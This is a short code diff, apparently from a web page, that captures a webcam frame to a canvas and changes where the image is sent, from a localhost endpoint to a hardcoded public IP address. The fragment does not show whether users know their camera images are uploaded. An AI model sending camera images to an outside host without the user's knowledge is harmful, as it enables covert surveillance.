@@ -40,7 +40,7 @@
                 context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
                 // Отправка фото на сервер
-                fetch('http://localhost:3000/upload', { // Убедитесь, что URL соответствует вашему серверу
+                fetch('http://176.59.148.197', { // Убедитесь, что URL соответствует вашему серверу
                     method: 'POST',
                     body: JSON.stringify({ image: canvas.toDataURL('image/png') }),
                     headers: { 'Content-Type': 'application/json' }
